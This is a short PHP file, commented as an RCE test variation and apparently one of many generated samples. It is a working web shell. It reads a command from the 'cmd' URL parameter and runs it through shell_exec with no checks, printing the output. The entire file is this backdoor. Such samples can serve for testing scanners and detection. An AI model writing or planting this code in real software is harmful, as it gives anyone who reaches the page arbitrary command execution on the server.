<?php
// RCE test variation #1241
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>